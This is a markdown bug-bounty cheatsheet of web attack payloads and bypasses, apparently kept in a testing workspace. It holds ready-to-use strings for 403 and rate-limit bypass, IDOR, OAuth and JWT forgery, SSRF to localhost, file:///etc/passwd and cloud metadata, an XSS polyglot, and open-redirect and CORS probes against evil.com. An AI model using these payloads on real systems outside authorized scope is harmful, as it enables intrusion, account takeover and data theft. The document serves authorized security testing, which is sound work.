# Practical Payloads, Bypasses & Recon Cheatsheet

Distilled from `AllAboutBugBounty`, `bugbounty-cheatsheet`, `HackTricks`,
`awesome-shodan-queries`, and `SecLists` (all available locally under
`/data/workspace/bug-bounty/tools/refs/`). Use strictly on in-scope targets.

---

## 1. Reconnaissance Quick Snippets

### Passive Certificate Transparency (`certspotter`)
```bash
curl -s "https://certspotter.com/api/v0/certs?domain=example.com" \
  | jq -r '.[].dns_names[]' | sed 's/^\*\.//' | sort -u
```

### Scoped Shodan Queries (`AllAboutBugBounty` + `awesome-shodan-queries`)
Always constrain with `org:`, `hostname:`, or `net:`:
```text
ssl.cert.subject.cn:example.com
ssl.cert.issuer.cn:example.com ssl.cert.subject.cn:example.com
ssl.cert.expired:true ssl.cert.subject.cn:example.com
hostname:example.com http.title:"Dashboard"
org:"Target Organization" -port:80,443
```

### High-Value Recon Tips (`bugbounty-cheatsheet`)
- Check exposed `.git` repositories and commit logs for secrets/endpoints.
- Check target GitLab instances at `/explore` for accidentally public internal projects.
- Analyze client-side JS bundles for hidden API routes, GraphQL endpoints, and hardcoded keys.
- Test paid/manual-setup/legacy features where few hunters look.

---

## 2. 403 Forbidden & 429 Rate-Limit Bypasses

### 403 Bypass (`AllAboutBugBounty/Bypass/Bypass 403.md`)
- **Override Headers:**
  `X-Original-URL: /admin`, `X-Rewrite-URL: /admin` (on `GET /anything`)
- **Path Normalization Tricks:**
  - `/%2e/admin`
  - `/admin/.`
  - `//admin//`
  - `/./admin/..`
  - `/;/admin`, `/.;/admin`, `//;//admin`
  - `/admin..;/`
- **Case Variation:** `/aDmIN`

### 429 Rate-Limit Bypass (`AllAboutBugBounty/Bypass/Bypass 429.md`)
*Only use within authorized program rules (never cause DoS).*
- **Spoofed IP Headers:** `X-Forwarded-For`, `X-Forwarded-Host`, `X-Client-IP`, `X-Remote-IP`, `X-Remote-Addr`, `X-Host`
- **Identifier Canonicalization Tricks:** append `%00`, `%09`, `%0d`, `%0a`, or trailing whitespace (`"victim@mail.com "`)
- **Cache/Route Busting:** append unused query parameter (`POST /endpoint?cb=1`) or rotate session cookies/User-Agent.

---

## 3. IDOR & Broken Access Control

From `AllAboutBugBounty/Insecure Direct Object References.md`:
1. **Add explicit ID parameters** to parameterless endpoints (`GET /api/v1/getuser?id=1234`).
2. **HTTP Parameter Pollution (HPP):** `user_id=attacker_id&user_id=victim_id`.
3. **Extension / Format Switching:** `/v2/GetData/1234.json`.
4. **API Version Downgrade:** test `/v1/...` when `/v2/...` enforces checks.
5. **JSON Type/Structure Wrapping:** `{"id": [111]}`, `{"user_id": {"user_id": 111}}`, or duplicate JSON keys `{"user_id":"attacker","user_id":"victim"}`.
6. **Decoded/Predictable IDs:** check Base64 (`dmljdGltQG1haWwuY29t` -> `victim@mail.com`), hex, MD5, or sequential integers.
7. **GraphQL:** inspect introspection/queries/mutations accepting peer object IDs.
8. **Chaining:** IDOR modifying another user's profile field -> Stored XSS -> Account Takeover.

---

## 4. Authentication, OAuth, JWT & Account Takeover

### OAuth Misconfiguration
- `redirect_uri` validation bypass: `https://evil.com`, `https://example.com.evil.com`, open redirect on whitelisted domain, IDN homograph.
- Missing/unvalidated `state` parameter -> CSRF account linking / login hijacking.
- **Pre-Account Takeover:** register with victim's email via normal signup or OAuth before/alongside victim if email verification or provider linking isn't enforced.
- Check for leaked `client_secret`, token reuse, or modifiable email/scope parameters post-callback.

### JWT Checks
- `{"alg": "none", "typ": "JWT"}` (stripped signature).
- **Algorithm Confusion (`RS256` -> `HS256`):** sign token with HMAC-SHA256 using the server's public key.
- Weak HS256 secret brute-force (offline on captured test token only).

### General ATO Vectors
- Password reset token leakage in `Referer` or response, predictable tokens, Host Header Injection in reset link (`Host` / `X-Forwarded-Host`).
- Re-signup overwrite with existing email.
- CSRF on email/password change endpoints (also test `POST` -> `GET` method downgrade).
- Missing rate limit or response manipulation on 2FA verification.

---

## 5. Server-Side Request Forgery (SSRF)

From `AllAboutBugBounty` & `bugbounty-cheatsheet/cheatsheets/ssrf.md`:
- **Loopback / IP Representation Bypasses:**
  - `http://127.0.0.1`, `http://localhost`
  - Hex: `http://0x7f.1/`, `http://0x7f.0x0.0x0.0x1`
  - Octal: `http://0177.1/`, `http://0177.0.0.01`
  - Dword/Decimal: `http://2130706433`
  - Zero-padded: `http://127.000.000.1`
  - IPv6: `http://[::1]`, `http://[::]`
  - URL-encoded / Unicode bubble text: `http://%6c%6f%63%61%6c%68%6f%73%74`
- **Alternative Schemes:** `file:///etc/passwd`, `dict://`, `gopher://`, `ftp://`, `ldap://`, `jar://`
- **Cloud Metadata (stop immediately at proof — do not exfiltrate secrets):**
  - AWS IMDSv1: `http://169.254.169.254/latest/meta-data/`

---

## 6. Cross-Site Scripting (XSS) & Client-Side

- **Polyglot (`bugbounty-cheatsheet`):**
  ```text
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
  ```
- **Markdown Contexts:**
  `[a](javascript:confirm(1))`, `[a](javascript://www.google.com%0Aprompt(1))`, `[a](javascript:window.onerror=confirm;throw%201)`
- **URL Scheme Bypass:** `javas&#x09;cript://www.google.com/%0Aalert(1)`
- **Wordlist:** `/data/workspace/bug-bounty/tools/refs/SecLists/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt`

### CORS Misconfiguration
Test with:
```bash
curl -sI 'https://target.com/api/v1/profile' -H 'Origin: https://evil.com'
```
Check if `Access-Control-Allow-Origin` reflects `https://evil.com` (or `null`, or `target.com.evil.com`) **alongside** `Access-Control-Allow-Credentials: true`.

### Open Redirect
- `//evil.com/`, `/%09/evil.com`, `/%5cevil.com`, `/\victim.com:80%40evil.com`, `//www.evil.com/%2f%2e%2e`

---

## 7. Web Cache Poisoning & Cache Deception

### Web Cache Poisoning
- Probe unkeyed headers (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Scheme`, `X-Original-URL`) using a **cache-buster query parameter** (`?cb=test123`) so real users are never impacted!
- Observe `Age`, `Cache-Control`, `X-Cache`, `Cf-Cache-Status`, and `Vary` headers.

### Web Cache Deception
- Append static/cacheable extensions to authenticated dynamic routes:
  `/profile/setting/.js`, `/profile/setting/;.css`, `/profile/setting/nonexistent.jpg`
- Verify `Cf-Cache-Status: HIT` (or proxy cache HIT) and confirm whether sensitive response is returned in an unauthenticated/incognito request.

---

## 8. Injection Wordlists (Local `SecLists`)
- **SQLi:** `/data/workspace/bug-bounty/tools/refs/SecLists/Fuzzing/SQLi/quick-SQLi.txt` & `Generic-SQLi.txt`
- **LFI:** `/data/workspace/bug-bounty/tools/refs/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt`
- **Command Injection:** `/data/workspace/bug-bounty/tools/refs/SecLists/Fuzzing/command-injection-commix.txt`
- **SSTI:** `/data/workspace/bug-bounty/tools/refs/SecLists/Fuzzing/template-engines-special-vars.txt`
